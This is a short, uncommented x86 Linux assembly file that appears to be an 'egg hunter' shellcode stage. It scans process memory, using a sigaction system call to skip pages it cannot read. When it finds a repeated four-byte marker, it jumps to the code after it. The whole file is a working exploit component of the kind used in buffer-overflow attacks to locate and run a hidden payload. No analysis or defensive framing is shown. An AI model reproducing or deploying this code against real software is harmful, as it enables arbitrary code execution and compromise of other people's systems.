section .text
    global _start

_start:

.nextpage:
    or bx, 0xfff
.nextbyte:
    inc ebx
    push byte 0x43
    pop eax
    int 80h
    cmp al, 0xf2
    jz .nextpage
    mov eax, 0x50905090
    mov edi, ebx
    scasd
    jnz .nextbyte
    scasd
    jnz .nextbyte
    jmp edi
